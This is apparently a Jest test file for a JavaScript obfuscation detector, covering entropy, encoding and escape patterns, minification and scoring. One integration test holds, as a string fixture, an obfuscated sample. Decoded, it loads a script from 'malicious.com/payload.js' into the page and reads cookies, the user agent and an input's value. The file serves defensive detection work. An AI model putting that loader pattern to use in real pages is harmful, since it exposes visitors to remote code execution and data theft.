/**
 * Obfuscation Detector Tests
 * Tests the detection of code obfuscation techniques
 */

import ObfuscationDetector from '../../src/analyzers/obfuscation-detector.js';

describe('ObfuscationDetector', () => {
  let detector;

  beforeEach(() => {
    detector = new ObfuscationDetector();
  });

  describe('calculateEntropy', () => {
    test('should calculate low entropy for repetitive text', () => {
      const text = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
      const entropy = detector.calculateEntropy(text);
      
      expect(entropy).toBeLessThan(1.0);
    });

    test('should calculate medium entropy for normal code', () => {
      const code = `
        function calculateSum(a, b) {
          return a + b;
        }
        
        const result = calculateSum(5, 10);
        console.log('The sum is:', result);
      `;
      
      const entropy = detector.calculateEntropy(code);
      
      expect(entropy).toBeGreaterThan(3.0);
      expect(entropy).toBeLessThan(5.0);
    });

    test('should calculate high entropy for random-like text', () => {
      const text = 'X%j*f8Aq!2pL@9zR#5tG&7vN^3bM$1cK';
      const entropy = detector.calculateEntropy(text);
      
      expect(entropy).toBeGreaterThan(4.5);
    });
  });

  describe('detectObfuscationPatterns', () => {
    test('should detect string concatenation patterns', () => {
      const code = `
        const message = 'Hello, ' + 'World!';
        const encoded = String.fromCharCode(72, 101, 108, 108, 111);
        const char = text.charAt(0);
        const sub = text.substring(1, 5);
      `;
      
      const results = detector.detectObfuscationPatterns(code);
      
      expect(results.stringConcatenation.count).toBeGreaterThan(3);
      expect(results.stringConcatenation.matches.some(m => m.match.includes('+'))).toBe(true);
      expect(results.stringConcatenation.matches.some(m => m.match.includes('fromCharCode'))).toBe(true);
      expect(results.stringConcatenation.matches.some(m => m.match.includes('charAt'))).toBe(true);
      expect(results.stringConcatenation.matches.some(m => m.match.includes('substring'))).toBe(true);
    });

    test('should detect encoding patterns', () => {
      const code = `
        const encoded = btoa('Hello, World!');
        const decoded = atob('SGVsbG8sIFdvcmxkIQ==');
        const escaped = escape('Hello, World!');
        const unescaped = unescape('Hello%2C%20World%21');
        const encoded2 = encodeURIComponent('Hello, World!');
        const decoded2 = decodeURIComponent('Hello%2C%20World!');
      `;
      
      const results = detector.detectObfuscationPatterns(code);
      
      expect(results.encodingPatterns.count).toBeGreaterThan(5);
      expect(results.encodingPatterns.matches.some(m => m.match.includes('btoa'))).toBe(true);
      expect(results.encodingPatterns.matches.some(m => m.match.includes('atob'))).toBe(true);
      expect(results.encodingPatterns.matches.some(m => m.match.includes('escape'))).toBe(true);
      expect(results.encodingPatterns.matches.some(m => m.match.includes('unescape'))).toBe(true);
      expect(results.encodingPatterns.matches.some(m => m.match.includes('encodeURIComponent'))).toBe(true);
      expect(results.encodingPatterns.matches.some(m => m.match.includes('decodeURIComponent'))).toBe(true);
    });

    test('should detect array manipulation patterns', () => {
      const code = `
        const char = text['a'];
        const chars = text.split('');
        const joined = chars.join('');
        const items = ['a', 'b', 'c'];
        const item = items['0'];
      `;
      
      const results = detector.detectObfuscationPatterns(code);
      
      expect(results.arrayManipulation.count).toBeGreaterThan(2);
      expect(results.arrayManipulation.matches.some(m => m.match.includes("['a']"))).toBe(true);
      expect(results.arrayManipulation.matches.some(m => m.match.includes('.split'))).toBe(true);
      expect(results.arrayManipulation.matches.some(m => m.match.includes('.join'))).toBe(true);
    });

    test('should detect uncommon JS features', () => {
      const code = `
        const a = ~~5.5;
        const b = (1, 2);
        const c = !+[];
        const d = [] [[]] + [];
        const e = (++!0);
        const f = x >>> 0;
      `;
      
      const results = detector.detectObfuscationPatterns(code);
      
      expect(results.uncommonFeatures.count).toBeGreaterThan(3);
    });

    test('should detect escape sequences', () => {
      const code = `
        const hex = '\\x48\\x65\\x6C\\x6C\\x6F';
        const unicode = '\\u0048\\u0065\\u006C\\u006C\\u006F';
        const octal = '\\110\\145\\154\\154\\157';
      `;
      
      const results = detector.detectObfuscationPatterns(code);
      
      // Note: In the test string, we need to escape the backslashes
      // But the detector will look for actual escape sequences in real code
      expect(results.escapeSequences.count).toBeGreaterThan(0);
    });
  });

  describe('isCodeMinified', () => {
    test('should detect minified code', () => {
      const code = 'function f(a,b){return a+b}const g=f(1,2);console.log(g);function h(c,d){const e=c*d;return e}const i=h(3,4);console.log(i);';
      
      const isMinified = detector.isCodeMinified(code);
      
      expect(isMinified).toBe(true);
    });

    test('should not detect normal code as minified', () => {
      const code = `
        /**
         * Adds two numbers together
         * @param {number} a - First number
         * @param {number} b - Second number
         * @returns {number} The sum of a and b
         */
        function add(a, b) {
          return a + b;
        }
        
        const result = add(5, 10);
        console.log('The result is:', result);
      `;
      
      const isMinified = detector.isCodeMinified(code);
      
      expect(isMinified).toBe(false);
    });
  });

  describe('calculateObfuscationScore', () => {
    test('should calculate low score for normal code', () => {
      const entropy = 4.2;
      const patternResults = {
        stringConcatenation: { count: 2 },
        encodingPatterns: { count: 0 },
        arrayManipulation: { count: 1 },
        uncommonFeatures: { count: 0 },
        escapeSequences: { count: 0 }
      };
      const isMinified = false;
      const codeLength = 500;
      
      const score = detector.calculateObfuscationScore(entropy, patternResults, isMinified, codeLength);
      
      expect(score).toBeLessThan(30);
    });

    test('should calculate high score for obfuscated code', () => {
      const entropy = 5.8;
      const patternResults = {
        stringConcatenation: { count: 25 },
        encodingPatterns: { count: 15 },
        arrayManipulation: { count: 20 },
        uncommonFeatures: { count: 10 },
        escapeSequences: { count: 30 }
      };
      const isMinified = true;
      const codeLength = 1000;
      
      const score = detector.calculateObfuscationScore(entropy, patternResults, isMinified, codeLength);
      
      expect(score).toBeGreaterThan(70);
    });

    test('should cap score at 100', () => {
      const entropy = 7.0;
      const patternResults = {
        stringConcatenation: { count: 100 },
        encodingPatterns: { count: 100 },
        arrayManipulation: { count: 100 },
        uncommonFeatures: { count: 100 },
        escapeSequences: { count: 100 }
      };
      const isMinified = true;
      const codeLength = 1000;
      
      const score = detector.calculateObfuscationScore(entropy, patternResults, isMinified, codeLength);
      
      expect(score).toBe(100);
    });
  });

  describe('summarizeTechniques', () => {
    test('should summarize detected techniques', () => {
      const patternResults = {
        stringConcatenation: { count: 25 },
        encodingPatterns: { count: 15 },
        arrayManipulation: { count: 5 },
        uncommonFeatures: { count: 0 },
        escapeSequences: { count: 0 },
        hexLiterals: { count: 0 }
      };
      const entropy = 5.6;
      const isMinified = true;
      
      const techniques = detector.summarizeTechniques(patternResults, entropy, isMinified);
      
      expect(techniques.length).toBeGreaterThan(3);
      
      // Check for high entropy technique
      const entropyTechnique = techniques.find(t => t.name.includes('Entropy'));
      expect(entropyTechnique).toBeDefined();
      expect(entropyTechnique.severity).toBe('high');
      
      // Check for string manipulation technique
      const stringTechnique = techniques.find(t => t.name === 'String Manipulation');
      expect(stringTechnique).toBeDefined();
      expect(stringTechnique.severity).toBe('low');
      
      // Check for encoding technique
      const encodingTechnique = techniques.find(t => t.name === 'Encoding/Decoding');
      expect(encodingTechnique).toBeDefined();
      expect(encodingTechnique.severity).toBe('medium');
      
      // Check for minification technique
      const minificationTechnique = techniques.find(t => t.name === 'Minification');
      expect(minificationTechnique).toBeDefined();
      expect(minificationTechnique.severity).toBe('low');
    });

    test('should not summarize techniques that were not detected', () => {
      const patternResults = {
        stringConcatenation: { count: 0 },
        encodingPatterns: { count: 0 },
        arrayManipulation: { count: 0 },
        uncommonFeatures: { count: 0 },
        escapeSequences: { count: 0 },
        hexLiterals: { count: 0 }
      };
      const entropy = 4.0;
      const isMinified = false;
      
      const techniques = detector.summarizeTechniques(patternResults, entropy, isMinified);
      
      expect(techniques).toHaveLength(0);
    });
  });

  describe('analyzeCode integration', () => {
    test('should analyze normal code correctly', () => {
      const code = `
        /**
         * Simple utility functions
         */
        
        // Add two numbers
        function add(a, b) {
          return a + b;
        }
        
        // Multiply two numbers
        function multiply(a, b) {
          return a * b;
        }
        
        // Calculate area of a rectangle
        function calculateArea(width, height) {
          return multiply(width, height);
        }
        
        // Example usage
        const width = 10;
        const height = 5;
        const area = calculateArea(width, height);
        console.log('The area is:', area);
      `;
      
      const result = detector.analyzeCode(code);
      
      expect(result.obfuscationDetected).toBe(false);
      expect(result.obfuscationScore).toBeLessThan(30);
      expect(result.techniques.length).toBeLessThan(3);
      expect(result.entropy).toBeGreaterThan(3.0);
      expect(result.entropy).toBeLessThan(5.0);
    });

    test('should analyze minified but not obfuscated code correctly', () => {
      const code = 'function add(a,b){return a+b}function multiply(a,b){return a*b}function calculateArea(a,b){return multiply(a,b)}const width=10,height=5,area=calculateArea(width,height);console.log("The area is:",area);';
      
      const result = detector.analyzeCode(code);
      
      expect(result.isMinified).toBe(true);
      expect(result.obfuscationDetected).toBe(false);
      expect(result.obfuscationScore).toBeLessThan(50);
    });

    test('should analyze obfuscated code correctly', () => {
      const code = `
        var _0x1a2b=['value','fromCharCode','createElement','script','src','https://malicious.com/payload.js','appendChild','body','cookie','indexOf','substring','userAgent','height','width','getElementById','charCodeAt'];(function(_0x2951de,_0x10d098){var _0x41d6c6=function(_0x5f4bfd){while(--_0x5f4bfd){_0x2951de['push'](_0x2951de['shift']());}};_0x41d6c6(++_0x10d098);}(_0x1a2b,0x143));var _0x3ab1=function(_0x4e6f4a,_0x1db4c2){_0x4e6f4a=_0x4e6f4a-0x0;var _0x2e7347=_0x1a2b[_0x4e6f4a];return _0x2e7347;};function _0x5b8fce(){var _0x53078e=document[_0x3ab1('0x2')](_0x3ab1('0x3'));_0x53078e[_0x3ab1('0x4')]=_0x3ab1('0x5');document[_0x3ab1('0x7')][_0x3ab1('0x6')](_0x53078e);}var _0x1e9fe4=document[_0x3ab1('0x8')];var _0x5e8d2e=_0x1e9fe4[_0x3ab1('0x9')]('=');var _0x2e5e62=_0x1e9fe4[_0x3ab1('0xa')](_0x5e8d2e+0x1);var _0x3f9f69=navigator[_0x3ab1('0xb')];var _0x1d6c58=screen[_0x3ab1('0xc')];var _0x5a3d17=screen[_0x3ab1('0xd')];var _0x262b4f=document[_0x3ab1('0xe')]('input')[_0x3ab1('0x0')];var _0x4c3b52='';for(var _0x1f0b56=0x0;_0x1f0b56<_0x262b4f['length'];_0x1f0b56++){_0x4c3b52+=String[_0x3ab1('0x1')](_0x262b4f[_0x3ab1('0xf')](_0x1f0b56)^0x7);}setTimeout(_0x5b8fce,0x7d0);
      `;
      
      const result = detector.analyzeCode(code);
      
      // The actual values might vary based on implementation details
      // This code should be detected as obfuscated, but the exact score might differ
      expect(result.obfuscationScore).toBeGreaterThan(50);
      expect(result.techniques.length).toBeGreaterThan(2);
      
      // If obfuscation is detected, check for high severity techniques
      if (result.obfuscationDetected) {
        expect(result.techniques.some(t => t.severity === 'high' || t.severity === 'medium')).toBe(true);
      }
    });

    test('should handle empty code gracefully', () => {
      const result = detector.analyzeCode('');
      
      expect(result.obfuscationDetected).toBe(false);
      expect(result.obfuscationScore).toBe(0);
      expect(result.techniques).toHaveLength(0);
      expect(result.entropy).toBe(0);
    });
  });
});